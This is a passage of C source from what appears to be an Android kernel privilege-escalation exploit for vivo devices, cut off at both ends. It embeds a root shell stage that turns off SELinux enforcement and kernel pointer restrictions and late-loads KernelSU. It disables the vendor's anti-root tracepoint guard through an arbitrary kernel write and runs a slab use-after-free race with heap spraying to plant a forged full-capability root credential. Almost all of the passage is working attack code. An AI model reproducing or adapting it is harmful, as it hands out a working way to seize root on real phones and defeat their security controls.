    n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0)
        return -1;
    buf[n] = 0;
    p = strstr(buf, "\nUid:");
    if (!p)
        return -1;
    p += 5;
    while (*p == '\t' || *p == ' ')
        p++;
    *uid_out = strtoul(p, NULL, 10);
    return 0;
}

/* Wake the blocked child and read its own getuid/geteuid.  Valid only in
 * fake/diag/fullshell modes, where wait_child_main runs the peek protocol;
 * this is the only way to see task->cred (the fake cred), because /proc
 * reports real_cred. */
static int poke_child(int go_fd, int st_fd, char cmd, int *uid, int *euid)
{
    int st[2];

    if (write(go_fd, &cmd, 1) != 1)
        return -1;
    if (read(st_fd, st, sizeof(st)) != sizeof(st))
        return -1;
    if (uid)
        *uid = st[0];
    if (euid)
        *euid = st[1];
    return 0;
}

static int write_ksu_script(void)
{
    static const char script[] =
        "#!/system/bin/sh\n"
        "exec 2>&1\n"
        "echo '[ksu] flow=ghostlock-init'\n"
        "print_state() {\n"
        "  echo \"[ksu] $1 uid=$(id -u) seccomp=$(awk '/^Seccomp:/{print $2}' /proc/self/status) selinux=$(getenforce)\"\n"
        "}\n"
        "print_state before-ksud\n"
        "grep -E '^Cap' /proc/self/status\n"
        "PKG=${IC_KSU_PKG:-}\n"
        "[ \"$PKG\" = \"-\" ] && PKG=\n"
        "if [ -z \"$PKG\" ]; then\n"
        "  for c in com.kowx712.kowsupro me.weishu.kernelsu com.sukisu.ultra com.rifsxd.ksunext org.bakasu.bakasu com.resukisu.resukisu com.sakisu.sakisu me.yuki.fina com.sevenk.core com.sevenkimimasy.love me.inkdye.vivoksu; do\n"
        "    [ -n \"$(pm path $c 2>/dev/null)\" ] && PKG=$c && break\n"
        "  done\n"
        "fi\n"
        "[ -n \"$PKG\" ] || PKG=me.weishu.kernelsu\n"
        "echo \"[ksu] manager pkg=$PKG\"\n"
        "APK=$(pm path \"$PKG\" 2>/dev/null | head -1 | cut -d: -f2)\n"
        "KSUD=''\n"
        "if [ -n \"$APK\" ]; then "
        "KSUD=\"$(dirname \"$APK\")/lib/arm64/libksud.so\"; fi\n"
        "[ -x \"$KSUD\" ] || KSUD=$(find /data/app -path "
        "\"*/$PKG*/lib/arm64/libksud.so\" 2>/dev/null | head -1)\n"
        "[ -x \"$KSUD\" ] || KSUD=/data/adb/ksu/bin/ksud\n"
        "if [ ! -f \"$KSUD\" ] && [ ! -x \"$KSUD\" ]; then echo '[ksu] ksud missing'; exit 1; fi\n"
        "# Copy ksud to /data/local/tmp so it is always executable\n"
        "# (/data/app may be mounted noexec on some devices).\n"
        "KSUD_TMP=/data/local/tmp/ksud_run\n"
        "cp -f \"$KSUD\" \"$KSUD_TMP\" 2>/dev/null\n"
        "chmod 755 \"$KSUD_TMP\" 2>/dev/null\n"
        "if [ -x \"$KSUD_TMP\" ]; then KSUD=\"$KSUD_TMP\"; fi\n"
        "echo \"[ksu] ksud=$KSUD version=$($KSUD --version 2>&1 | head -1)\"\n"
        "# KernelSU may already be resident from an earlier chain in this boot.\n"
        "# late-load would then fail on the duplicate module, and that failure\n"
        "# says nothing about this exploit -- skip straight to the state print.\n"
        "if grep -q '^kernelsu ' /proc/modules 2>/dev/null; then\n"
        "  echo '[ksu] kernelsu already resident; skipping late-load'\n"
        "  KSU_RC=0\n"
        "else\n"
        "# Derive the KMI from the running kernel instead of hardcoding it:\n"
        "#   uname -r -> <major>.<minor>.<rest>-android<N>-...  =>  android<N>-<major>.<minor>\n"
        "# late-load's --kmi names the module ABI, and a wrong one loads a ko\n"
        "# that refuses to resolve symbols against this image.\n"
        "KMI=\"$(uname -r | grep -o 'android[0-9]*' | head -1)-$(uname -r | cut -d. -f1-2)\"\n"
        "# Pre-clean bin assets while SELinux is still Permissive.\n"
        "# The daemon will re-extract them; leftover files with wrong\n"
        "# labels cause EACCES after Enforcing is restored.\n"
        "rm -f /data/adb/ksu/bin/busybox /data/adb/ksu/bin/bootctl 2>/dev/null\n"
        "rm -f /data/adb/ksu/bin/resetprop 2>/dev/null\n"
        "mkdir -p /data/adb/ksu/bin\n"
        "echo \"[ksu] late-load kmi=$KMI\"\n"
        "\"$KSUD\" late-load --kmi \"$KMI\" --allow-shell "
        "--package-name \"$PKG\"\n"
        "KSU_RC=$?\n"
        "fi\n"
        "echo \"[ksu] late-load rc=$KSU_RC\"\n"
        "print_state after-ksud\n"
        "i=0\n"
        "while [ $i -lt 50 ]; do\n"
        "  grep -q '^kernelsu ' /proc/modules && break\n"
        "  i=$((i+1)); sleep 0.1\n"
        "done\n"
        "if grep -q '^kernelsu ' /proc/modules; then echo KSU_LOADED; "
        "else echo KSU_MISSING; fi\n"
        "print_state after-module\n"
        "echo '[ksu] ---- debug info begin ----'\n"
        "\"$KSUD\" debug info 2>&1\n"
        "echo \"[ksu] debug info rc=$?\"\n"
        "echo 0 > /proc/sys/kernel/dmesg_restrict 2>/dev/null\n"
        "echo 0 > /proc/sys/kernel/kptr_restrict 2>/dev/null\n"
        "echo 0 > /sys/fs/selinux/enforce 2>/dev/null\n"
        "KSU_INIT_RC=0\n"
        "INIT_LOG=/data/local/tmp/ksud-init.log\n"
        "# ksud late-load daemonises; its background process may have\n"
        "# already called setenforce(true) from init.c.  Force permissive\n"
        "# before any -x test so /data/adb/ksud is accessible.\n"
        "echo 0 > /sys/fs/selinux/enforce 2>/dev/null\n"
        "# Wait up to 3s for the daemon to finish install() -> /data/adb/ksud.\n"
        "i=0; while [ $i -lt 30 ] && [ ! -f /data/adb/ksud ]; do "
        "i=$((i+1)); sleep 0.1; done\n"
        "chmod 755 /data/adb/ksud 2>/dev/null\n"
        "if [ -x /data/adb/ksud ]; then\n"
        "  KSUD=/data/adb/ksud\n"
        "elif [ -x \"$KSUD_TMP\" ]; then\n"
        "  KSUD=\"$KSUD_TMP\"\n"
        "fi\n"
        "echo \"[ksu] init ksud resolved to $KSUD\"\n"
        "echo '[ksu] init setup begin'\n"
        "# Fail closed if the stage log cannot be created.  Every result below is\n"
        "# written into this file, and the redirection on the block is silent, so\n"
        "# an unusable INIT_LOG would otherwise look like a clean empty run.\n"
        "if ! ( : >\"$INIT_LOG\" ) 2>/dev/null; then\n"
        "  echo '[ksu] cannot create init log; stage fails closed'\n"
        "  KSU_INIT_RC=1\n"
        "fi\n"
        "{\n"
        "  echo __INIT_BEGIN__\n"
        "  mkdir -p /data/adb/ksu/bin\n"
        "  # Wait for ksud daemon to finish (restorecon, ensure_binaries, etc.)\n"
        "  # so the init stages see correctly-labelled files and skip re-extraction.\n"
        "  i=0; while [ $i -lt 300 ] && pgrep -f ksud_run >/dev/null 2>&1; do "
        "i=$((i+1)); sleep 0.1; done\n"
        "  echo \"[ksu] daemon wait: ${i}x0.1s\"\n"
        "  echo 0 > /sys/fs/selinux/enforce 2>/dev/null\n"
        "  echo \"[ksu] init ksud=$KSUD\"\n"
        "  # In late-load mode the kernel skips post-fs-data / boot-completed\n"
        "  # events (dispatch.c: ksu_late_loaded), and the daemon already ran\n"
        "  # ensure_binaries, restorecon, sepolicy, and module scripts.\n"
        "  # Just verify the daemon left a working ksud and the module is live.\n"
        "  if grep -q '^kernelsu ' /proc/modules 2>/dev/null; then\n"
        "    echo '[ksu] late-load daemon completed; skipping redundant init stages'\n"
        "  else\n"
        "    echo \"[ksu] ksud not executable or module not loaded; ksud=$KSUD\"\n"
        "    KSU_INIT_RC=1\n"
        "  fi\n"
        "  if [ $KSU_INIT_RC -eq 0 ]; then\n"
        "    echo '[ksu] init stages complete'\n"
        "    echo __INIT_DONE__\n"
        "  else\n"
        "    echo __INIT_FAILED__\n"
        "  fi\n"
        "} >>\"$INIT_LOG\" 2>&1\n"
        "# The parent watches this file to decide whether the handoff is\n"
        "# complete.  __INIT_DONE__ is only written when every stage returned 0.\n"
        "# 644, not 666: the root worker's umask may leave it 0600, and the\n"
        "# parent (uid 2000) has to read it -- but there is no reason to make a\n"
        "# root-written log world-writable.\n"
        "chmod 644 \"$INIT_LOG\" 2>/dev/null\n"
        "cat \"$INIT_LOG\" 2>&1\n"
        "# ---- NO manager launch here -----------------------------------------\n"
        "# Do not `am start` the manager from this script.  This runs before the\n"
        "# parent has confirmed that the driver is up and configured; a manager\n"
        "# started now caches a dead driver fd (libksud opens it once and keeps\n"
        "# it), which is exactly the 'manager opens, shows jailbreak mode, then\n"
        "# closes itself' symptom.  The parent owns the manager lifecycle: it\n"
        "# waits for `kernelsu` to become resident and only then does one\n"
        "# force-stop + start.  Leave the app alone here.\n"
        "KSU_FINAL_ENFORCE=$(getenforce)\n"
        "echo \"[ksu] enforce=$KSU_FINAL_ENFORCE after init stages\"\n"
        "# Success is the module being resident and the init stages returning 0.\n"
        "# SELinux state is NOT part of it: ksud restores Enforcing on its own\n"
        "# once the driver is up (and that is the healthy end state -- the\n"
        "# framework only works with policy enforced).  Requiring Permissive\n"
        "# here flagged a perfectly good handoff as incomplete.\n"
        "if [ $KSU_INIT_RC -eq 0 ]; then\n"
        "  echo '[ksu] stage complete'\n"
        "else\n"
        "  echo '[ksu] stage incomplete: init stage failed'\n"
        "fi\n";
    static const char diag_script[] =
        "#!/system/bin/sh\n"
        "exec 2>&1\n"
        "echo \"[diag] uid=$(id -u) selinux=$(getenforce)\"\n"
        "echo \"[diag] ctx=$(cat /proc/self/attr/current 2>&1)\"\n"
        "grep -E '^(Cap|Seccomp)' /proc/self/status\n"
        "echo '--- around selinux_state ---'\n"
        "grep -B6 -A6 ' selinux_state$' /proc/kallsyms\n"
        "echo '--- lsm blob sizes ---'\n"
        "grep -E ' (landlock_blob_sizes|selinux_blob_sizes|safesetid_blob_sizes|bpf_lsm_blob_sizes)$' /proc/kallsyms\n"
        "echo '[diag] done'\n";
    int fd = open("/data/local/tmp/ksu_stage.sh",
                  O_WRONLY | O_CREAT | O_TRUNC, 0755);

    if (fd < 0)
    {
        logf("[-] create ksu_stage.sh failed errno=%d\n", errno);
        return -1;
    }
    const char *body = g_diag ? diag_script : script;
    size_t total = g_diag ? sizeof(diag_script) - 1 : sizeof(script) - 1;
    size_t done = 0;

    while (done < total)
    {
        ssize_t n = write(fd, body + done, total - done);
        if (n < 0 && errno == EINTR)
            continue;
        if (n <= 0)
            break;
        done += (size_t)n;
    }
    int sync_rc = fsync(fd);
    int sync_errno = sync_rc ? errno : 0;
    int close_rc = close(fd);
    int chmod_rc = chmod("/data/local/tmp/ksu_stage.sh", 0755);
    int chmod_errno = chmod_rc ? errno : 0;

    logf("[ksu] stage script bytes=%zu/%zu fsync=%d close=%d chmod=%d\n",
         done, total, sync_rc, close_rc, chmod_rc);

    /* A truncated or non-executable script must not be handed to the root
     * child: it would run a prefix of the handoff and report a confusing
     * stage failure much later, after the driver is already loaded. */
    if (done != total || sync_rc != 0 || chmod_rc != 0)
    {
        logf("[-] stage script unusable (done=%zu/%zu fsync_errno=%d "
             "chmod_errno=%d)\n",
             done, total, sync_errno, chmod_errno);
        return -1;
    }
    return 0;
}

__attribute__((unused)) static int read_panic_on_warn(void)
{
    FILE *f = fopen("/proc/sys/kernel/panic_on_warn", "r");
    int value = -1;

    if (f)
    {
        if (fscanf(f, "%d", &value) != 1)
            value = -1;
        fclose(f);
    }
    logf("[ksu] panic_on_warn=%d\n", value);
    return value;
}

struct plant_res
{
    unsigned long long A;
    int ok;
    int retry;
};

static void run_plant(unsigned long long target, int tag, int mode,
                      struct plant_res *res, unsigned char *raw);

static int stage_write_retry(unsigned long long target, int mode,
                              const char *what, unsigned char *raw,
                              int max_attempts, struct plant_res *out)
{
    struct plant_res r;
    int retryable = 1;

    for (int attempt = 1; attempt <= max_attempts; attempt++)
    {
        memset(&r, 0, sizeof(r));
        logf("[+] stage %s attempt=%d/%d\n", what, attempt, max_attempts);
        run_plant(target, 1, mode, &r, raw);
        if (r.ok)
        {
            if (out)
                *out = r;
            return 0;
        }
        if (!r.retry)
            retryable = 0;
        logf("[-] stage %s miss; retrying\n", what);
    }
    /* 0=success, 1=all misses were exec-succeeded retryable cases,
     * -1=a target/zombie is held or an invariant failed. */
    return retryable ? 1 : -1;
}

__attribute__((unused)) static int stage_write(unsigned long long target, int mode,
                       const char *what, unsigned char *raw,
                       struct plant_res *out)
{
    struct plant_res r;

    for (int attempt = 1; attempt <= 3; attempt++)
    {
        memset(&r, 0, sizeof(r));
        logf("[+] stage %s target=%#llx mode=%s attempt=%d\n", what, target,
             mode == 2 ? "fake" : "zero", attempt);
        run_plant(target, 1, mode, &r, raw);
        if (r.ok)
        {
            if (out)
                *out = r;
            return 0;
        }
        if (!r.retry)
        {
            logf("[-] stage %s failed\n", what);
            return -1;
        }
    }
    logf("[-] stage %s exhausted retries\n", what);
    return -1;
}

/*
 * Anti-root guard neutralisation.
 * Clears __tracepoint_sys_exit.funcs so no sys_exit callback can kill the
 * root child or later KernelSU helpers.
 *
 * The original code also cleared two task fields.  The PoC guessed that vivo
 * tags a task at `task+0x28` ("VR_TAG_B") and zeroed that word plus the whole
 * `thread_info.flags` word.  Neither write is supported by anything in the
 * image, and both are destructive:
 *
 *   - On a 6.6.89 build `task+0x28` is `thread_info.cpu` (BTF: flags@0x00,
 *     ttbr0@0x08, union@0x10, scs_base@0x18, scs_sp@0x20, cpu@0x28), so a zero
 *     write there corrupts the recorded CPU of a live task.  6.1 may differ,
 *     but nothing establishes that vivo tagged that word on 6.1 either.
 *   - A zero write to `thread_info.flags`@0x00 clears every TIF_* bit at once.
 *
 * The chain does not need either write.  vr.ko hooks android_rvh_commit_creds
 * to tag any task that acquires min(uid,euid,suid,fsuid)==0 and kills it from
 * its sys_exit probe.  The 98260 credential switch happens on a kworker, so
 * the module load itself is exempt; what dies is the *userspace* root child
 * that later forks.  One NULL store to __tracepoint_sys_exit.funcs disables
 * every sys_exit probe for the rest of this boot, without touching any task
 * field.  Doing only this was verified end-to-end on a 6.6.89 build; the
 * two extra writes were not verified on any build.
 *
 * Fail-closed caveat: 98260 gives us an arbitrary *write*, not a read, so unlike
 * the LKM we cannot read back tp->name to confirm the layout before writing. The
 * TP_FUNCS_OFF choice is therefore verified offline only -- twice, from BTF and
 * from the Image itself (the qword at +0x00 resolves to the literal string
 * "sys_exit", and the funcs slot is the only NULL callback).  Re-derive it per
 * build: the member list grows between releases (6.6 inserted `probestub` before
 * `regfunc`, moving funcs from +0x40 to +0x48).  A wrong offset here would
 * corrupt an unrelated kernel pointer, so this is the one place in the chain
 * where an offset error is not merely "the plant missed".
 */
/* Read the handful of symbols the chain needs straight out of
 * /proc/kallsyms.  Masked addresses (all zeros) are treated as absent. */
static void read_kallsyms(void)
{
    FILE *f = fopen("/proc/kallsyms", "r");
    char line[256];
    char name[160];
    unsigned long long a;
    char t;

    if (!f)
    {
        logf("[ksym] /proc/kallsyms unavailable\n");
        return;
    }
    while (fgets(line, sizeof(line), f))
    {
        if (sscanf(line, "%llx %c %159s", &a, &t, name) != 3 || !a)
            continue;
        if (!strcmp(name, "_text") && !g_text_runtime)
            g_text_runtime = a;
        else if (!strcmp(name, "__tracepoint_sys_exit") && !g_tp_runtime)
            g_tp_runtime = a;
        else if (!strcmp(name, "selinux_state") && !g_selinux_runtime)
            g_selinux_runtime = a;
    }
    fclose(f);
    logf("[ksym] _text=%#llx tp_sys_exit=%#llx selinux_state=%#llx\n",
         g_text_runtime, g_tp_runtime, g_selinux_runtime);
}

static int defeat_vr(unsigned long long task, unsigned char *raw)
{
    (void)task;
    (void)raw;

    {
        unsigned long long tp = 0;

        if (g_tp_runtime)
            tp = g_tp_runtime;              /* kallsyms: absolute */
        else if (g_static_ok && g_slide)
            tp = TP_STATIC + g_slide;       /* profile + measured slide */
        else if (g_tp_link && g_slide)
            tp = g_tp_link + g_slide;       /* per-build table + slide */
        if (!tp)
        {
            logf("[-] vr: no __tracepoint_sys_exit address for this build\n");
            return -1;
        }
        logf("[+] vr: nulling __tracepoint_sys_exit.funcs at %#llx\n",
             tp + TP_FUNCS_OFF);
        /* Always write the absolute address computed above.  A relative
         * target here silently kept TP_STATIC (the profile's) for the
         * per-build-table path, aiming the write at the wrong address on
         * every build whose profile does not match. */
        g_rel_mode = 2;
        g_rel_abs = tp + TP_FUNCS_OFF;
    }
    if (stage_write_retry(0, 0, "vr_sys_exit_funcs", raw, 3, NULL))
    {
        logf("[-] vr: sys_exit.funcs write failed\n");
        g_rel_mode = 0;
        return -1;
    }
    g_rel_mode = 0;
    logf("[+] vr: sys_exit probe list neutralized\n");
    return 0;
}


#define SPRAY_THREADS 8
#define SPRAY_SOCKS 3072
#define SPRAY_PRE 2000
#define SPRAY_POST 10000
static _Atomic int g_burst, g_burst2, g_stop_spray;
static int g_pool[SPRAY_SOCKS][2];
static int g_pool_n;
static int g_rawfd[8] = {-1, -1, -1, -1, -1, -1, -1, -1};
static _Atomic int g_spray_tids[SPRAY_THREADS];

struct spray_arg
{
    unsigned char *payload;
    int sock_first, sock_count, cpu, idx;
};

static void ensure_pool(void)
{
    int snd = 16 << 20;

    if (g_pool_n)
        return;
    for (int i = 0; i < SPRAY_SOCKS; i++)
    {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_pool[i]))
            break;
        setsockopt(g_pool[i][0], SOL_SOCKET, SO_SNDBUF, &snd, sizeof(snd));
        setsockopt(g_pool[i][1], SOL_SOCKET, SO_RCVBUF, &snd, sizeof(snd));
        g_pool_n++;
    }
    if (!g_pool_n)
        park_forever("no spray sockets");
}

static void ensure_raw(void)
{
    for (int cpu = 0; cpu < 8; cpu++)
    {
        char path[128];

        if (g_rawfd[cpu] >= 0)
            continue;
        snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
        g_rawfd[cpu] = open(path, O_RDONLY | O_NONBLOCK);
    }
}

static long read_fd(int fd, unsigned char *buf, size_t cap)
{
    size_t tot = 0;

    if (fd < 0)
        return 0;
    while (tot < cap)
    {
        ssize_t r = read(fd, buf + tot, cap - tot);

        if (r <= 0)
            break;
        tot += (size_t)r;
    }
    return (long)tot;
}

/*
 * A page_alloc for the victim pfn is only a hit if one of our spray threads
 * performed it.  A system allocation can take the freed page first; reaping
 * that node would treat the system page contents as an rb_node and panic.
 */
static int scan_page_alloc_ours(const unsigned char *b, size_t n,
                                unsigned long long pfn)
{
    for (size_t i = 16; i + 12 <= n; i += 4)
    {
        int pid;

        if (u64(b, i) != pfn || (int)u32(b, i + 8) != 1)
            continue;
        if ((u32(b, i - 8) & 0xffff) != g_t_page_alloc)
            continue;
        pid = (int)u32(b, i - 4);
        for (int j = 0; j < SPRAY_THREADS; j++)
            if (pid == atomic_load(&g_spray_tids[j]))
                return 1;
    }
    return 0;
}

static void *spray_thread(void *x)
{
    struct spray_arg *a = x;
    int w = 0;

    atomic_store(&g_spray_tids[a->idx], (int)syscall(SYS_gettid));
    pin(a->cpu);
    while (!atomic_load(&g_burst) && !atomic_load(&g_stop_spray))
        sched_yield();
    /* Phase 1 runs before the target execs; it catches an early free. */
    while (!atomic_load(&g_stop_spray) && w < SPRAY_PRE)
    {
        int k = a->sock_first + (w % a->sock_count);

        (void)send(g_pool[k][0], a->payload, SOCKBUF, MSG_DONTWAIT);
        w++;
        if ((w & 0x1f) == 0)
            usleep(100);
    }
    /* Phase 2 is released when the parent sees the victim page free. */
    while (!atomic_load(&g_burst2) && !atomic_load(&g_stop_spray))
        sched_yield();
    while (!atomic_load(&g_stop_spray) && w < SPRAY_PRE + SPRAY_POST)
    {
        int k = a->sock_first + (w % a->sock_count);

        (void)send(g_pool[k][0], a->payload, SOCKBUF, MSG_DONTWAIT);
        w++;
        if ((w & 0x1f) == 0)
            usleep(20);
    }
    return NULL;
}

/* T and its VM helpers live in a private process group. PDEATHSIG is wrong
 * here: the creating thread can die during execve while the helpers must keep
 * racing. The controller cleans the whole group only after T reaches a terminal
 * plant state. */
static void kill_target_group(pid_t target)
{
    if (target > 0)
        (void)!kill(-target, SIGKILL);
}
static void run_plant(unsigned long long target, int tag, int mode,
                      struct plant_res *res, unsigned char *raw)
{
    unsigned long long ptrs[NTIMERS];
    unsigned long long pfn = 0, slab_pfn = 0;
    unsigned char *payload = NULL;
    pthread_t th[SPRAY_THREADS];
    struct spray_arg args[SPRAY_THREADS];
    int ready_p[2], ack_p[2], tid_p[2], timer_go[2];
    memset(res, 0, sizeof(*res));
    if (pipe(ready_p) || pipe(ack_p) || pipe(tid_p) || pipe(timer_go))
    {
        logf("[-] plant%d pipe failed\n", tag);
        return;
    }
    pid_t T = fork();
    if (T < 0)
    {
        logf("[-] plant%d fork failed\n", tag);
        return;
    }
    if (T == 0)
    {
        if (setpgid(0, 0))
            _exit(116);
        close(ready_p[0]);
        close(ack_p[1]);
        close(tid_p[0]);
        close(timer_go[1]);
        g_ready_w = ready_p[1];
        g_ack_r = ack_p[0];
        g_tid_w = tid_p[1];
        g_timer_go_r = timer_go[0];
        run_target();
        _exit(115);
    }
    close(ready_p[1]);
    close(ack_p[0]);
    close(tid_p[1]);
    close(timer_go[0]);
    g_timer_go_w = timer_go[1];
    char ch;
    if (read(ready_p[0], &ch, 1) != 1)
    {
        logf("[-] plant%d trigger never ready\n", tag);
        kill(T, SIGKILL);
        waitpid(T, NULL, 0);
        kill_target_group(T);
        return;
    }
    trace_start();
    if (write(ack_p[1], "A", 1) != 1)
        logf("[-] ack failed\n");
    int etid = 0;
    if (read(tid_p[0], &etid, sizeof(etid)) != sizeof(etid))
        logf("[-] exec tid not received\n");

    /*
     * The exec thread is paused after creating its 4096 timers.  Capture V,
     * the slab pfn and the linear-map base now, before the exec/free, so the
     * spray is already running when the victim slab returns to the buddy.
     */
    long n = read_cpu(g_cpu, raw, 48u << 20);
    unsigned long long kept[NTIMERS];
    unsigned long long V = 0, site0 = 0;
    unsigned long long vslab;
    int nrec, nkeep = 0, slab_own = 0, free_seen = 0;

    nrec = n > 0 ? scan_timer_allocs(raw, (size_t)n, etid, ptrs, NTIMERS,
                                     &site0)
                 : 0;
    if (!nrec || !site0)
    {
        trace_stop();
        kill(T, SIGKILL);
        waitpid(T, NULL, 0);
        kill_target_group(T);
        logf("[-] plant%d victim not captured (recs=%d)\n", tag, nrec);
        return;
    }
    {
        int ns = 0, np = 0;
        unsigned long long base;

        base = plant_base(raw, (size_t)n, etid, ptrs, nrec, &ns, &np);
        if (!base)
            base = g_base;
        if (!base || base < 0xffffff0000000000ULL ||
            base > 0xffffffc000000000ULL)
        {
            trace_stop();
            kill(T, SIGKILL);
            waitpid(T, NULL, 0);
            kill_target_group(T);
            logf("[-] plant%d bad base=%#llx ns=%d np=%d recs=%d\n",
                 tag, base, ns, np, nrec);
            return;
        }
        g_base = base;
        /*
         * The linear map is [base, 0xffffffc000000000) on this VA layout;
         * physical RAM is sparse and extends well past 16 GiB, so do not
         * bound by RAM size.  A pointer outside this window is a stale
         * kmem record or a mis-scanned site collision and must not shift
         * the victim index.
         */
        for (int i = 0; i < nrec; i++)
            if (ptrs[i] >= base && ptrs[i] < 0xffffffc000000000ULL)
                kept[nkeep++] = ptrs[i];
        logf("[+] plant%d base=%#llx slabs=%d pfns=%d recs=%d kept=%d\n",
             tag, base, ns, np, nrec, nkeep);
    }
    if (nkeep <= VICTIM_IDX)
    {
        trace_stop();
        kill(T, SIGKILL);
        waitpid(T, NULL, 0);
        kill_target_group(T);
        logf("[-] plant%d victim index missing (kept=%d)\n", tag, nkeep);
        return;
    }
    V = kept[VICTIM_IDX];
    vslab = V & ~0x1fffULL;
    for (int i = 0; i < nkeep; i++)
        if ((kept[i] & ~0x1fffULL) == vslab)
            slab_own++;
    pfn = (V - g_base) >> 12;
    slab_pfn = pfn & ~1ULL;
    if (g_static_ok)
        g_slide = site0 -
                  (g_timer_site_kind ? STATIC_TIMER_SITE_2 : STATIC_TIMER_SITE);
    else if (!g_text_runtime)
    {
        /* do_timer_create lives below 2 MiB in the 6.1 text layout and
         * KASLR slides are 2 MiB aligned, so the call site's low 21 bits
         * ARE its link offset: recompute the link address from them. */
        unsigned long long link =
            0xffffffc008000000ULL + (site0 & 0x1fffffULL);

        g_slide = site0 - link;
        logf("[slide] derived=%#llx from timer site %#llx\n",
             g_slide, site0);
    }
    /* otherwise keep the kallsyms-derived slide, if read_kallsyms() got one */

    /* KASLR text slides are 2 MiB aligned and well under 16 GiB.  An
     * implausible value means the captured call site belongs to another
     * build (low21 collision); stop before any write. */
    if (g_slide && ((g_slide & 0x1fffffULL) || g_slide > 0x8000000000ULL))
    {
        logf("[-] plant%d implausible slide %#llx (site=%#llx); refusing\n",
             tag, g_slide, site0);
        kill(T, SIGKILL);
        waitpid(T, NULL, 0);
        kill_target_group(T);
        return;
    }
    if (g_rel_mode == 2)
        target = g_rel_abs;
    else if (g_rel_mode)
        target = g_rel_static + g_slide + g_rel_off;

    {
        size_t off = (size_t)((V & 0x1fff) + 0x78);

        payload = malloc(SOCKBUF);
        if (!payload)
        {
            kill(T, SIGKILL);
            waitpid(T, NULL, 0);
            kill_target_group(T);
            return;
        }
        if (mode == 2)
        {
            unsigned long long page = V & ~0x1fffULL;
            unsigned long long *c = (unsigned long long *)(payload + off);
            size_t blob = 0, cand[] = {0x1f00, 0x1000, 0x1800, 0x800,
                                       0x100, 0x0};
            int fit = 0;

            if (off + 0xb0 > 0x2000)
            {
                logf("[-] plant%d fake cred spills off=%#zx; retryable\n",
                     tag, off);
                kill(T, SIGKILL);
                waitpid(T, NULL, 0);
                kill_target_group(T);
                free(payload);
                payload = NULL;
                res->retry = 1;
                return;
            }
            for (size_t i = 0; i < sizeof(cand) / sizeof(cand[0]); i++)
            {
                size_t b = cand[i];

                if (b + 0x40 > 0x2000)
                    continue;
                if (b + 0x40 <= off || off + 0xb0 <= b)
                {
                    blob = b;
                    fit = 1;
                    break;
                }
            }
            if (!fit)
            {
                kill(T, SIGKILL);
                waitpid(T, NULL, 0);
                kill_target_group(T);
                free(payload);
                payload = NULL;
                res->retry = 1;
                return;
            }
            build_payload(payload, off, V + 0x78, target);
            /* c[0]=A (usage), c[1]=uid/gid will be dirtied by rb erase,
             * c[2]=suid/sgid = target, both fixed by later zero plants. */
            c[3] = 0; /* euid/egid */
            c[4] = 0; /* fsuid/fsgid */
            c[5] = 0; /* securebits */
            /* cap_* and the refcounted sub-objects move between builds: this
             * image puts cap_* at 0x2c/0x34/... while a KASAN-built 6.6 image
             * starts them at 0x30/0x38/... (the anon union gains a 4-byte
             * pad).  Writing one word early leaves cap_inheritable invalid and
             * execve() returns EINVAL before ksud can run, so re-derive these
             * from BTF for every new build rather than copying them over. */
            *(unsigned long long *)(payload + off + OFF_CRED_CAP_INH) = FULLCAP;
            *(unsigned long long *)(payload + off + OFF_CRED_CAP_PERM) = FULLCAP;
            *(unsigned long long *)(payload + off + OFF_CRED_CAP_EFF) = FULLCAP;
            *(unsigned long long *)(payload + off + OFF_CRED_CAP_BSET) = FULLCAP;
            *(unsigned long long *)(payload + off + OFF_CRED_CAP_AMB) = FULLCAP;
            *(unsigned long long *)(payload + off + OFF_CRED_SECURITY) =
                page + blob; /* security */
            /* Prefer the external table's symbols (any build) over the
             * profile constants; the slide is already known here. */
            *(unsigned long long *)(payload + off + OFF_CRED_USER) =
                (g_root_user_link
                     ? g_root_user_link
                     : (g_static_ok ? ROOT_USER_STATIC : 0)) +
                g_slide;
            *(unsigned long long *)(payload + off + OFF_CRED_USER_NS) =
                (g_init_user_ns_link
                     ? g_init_user_ns_link
                     : (g_static_ok ? INIT_USER_NS_STATIC : 0)) +
                g_slide;
            *(unsigned long long *)(payload + off + OFF_CRED_UCOUNTS) =
                (g_init_ucounts_link
                     ? g_init_ucounts_link
                     : (g_static_ok ? INIT_UCOUNTS_STATIC : 0)) +
                g_slide;
            *(unsigned long long *)(payload + off + OFF_CRED_GROUP_INFO) =
                (g_init_groups_link
                     ? g_init_groups_link
                     : (g_static_ok ? INIT_GROUPS_STATIC : 0)) +
                g_slide;
            *(unsigned int *)(payload + blob + SELINUX_BLOB_OFF) =
                SELINUX_SID_KERNEL;
            *(unsigned int *)(payload + blob + SELINUX_BLOB_OFF + 4) =
                SELINUX_SID_KERNEL;
            logf("[+] plant%d fake cred off=%#zx blob=%#zx sec=%#llx\n",
                 tag, off, blob, page + blob);
        }
        else
        {
            build_payload(payload, off, 0, target);
        }
        slab_usage("pre-exec");
        logf("[+] plant%d V=%#llx A=%#llx pfn=%#llx slab=%#llx slide=%#llx "
             "recs=%d slab_own=%d/32 base=%#llx\n",
             tag, V, V + 0x78, pfn, slab_pfn, g_slide, nrec, slab_own,
             g_base);
    }

    atomic_store(&g_burst, 0);
    atomic_store(&g_burst2, 0);
    atomic_store(&g_stop_spray, 0);
    {
        int per = g_pool_n / SPRAY_THREADS;

        for (int i = 0; i < SPRAY_THREADS; i++)
        {
            args[i].payload = payload;
            args[i].sock_first = i * per;
            args[i].sock_count = per;
            args[i].cpu = i;
            args[i].idx = i;
            atomic_store(&g_spray_tids[i], -1);
            pthread_create(&th[i], NULL, spray_thread, &args[i]);
        }
    }
    /*
     * Release the race without spray CPU contention; V is already captured,
     * so the burst can start immediately after the zombie appears.
     */
    logf("[+] plant%d spray threads up\n", tag);
    if (g_timer_go_w >= 0)
    {
        if (write(g_timer_go_w, "x", 1) != 1)
            logf("[-] timer go failed\n");
        close(g_timer_go_w);
        g_timer_go_w = -1;
    }
    logf("[+] plant%d go sent, waiting zombie\n", tag);

    siginfo_t si;
    if (wait_zombie(T, &si))
    {
        atomic_store(&g_stop_spray, 1);
        atomic_store(&g_burst2, 1);
        for (int i = 0; i < SPRAY_THREADS; i++)
            pthread_join(th[i], NULL);
        trace_stop();
        logf("[-] plant%d no zombie; holding child\n", tag);
        kill_target_group(T);
        g_held++;
        return;
    }
    logf("[+] plant%d target=%d etid=%d zombie code=%d status=%d\n",
         tag, T, etid, si.si_code, si.si_status);
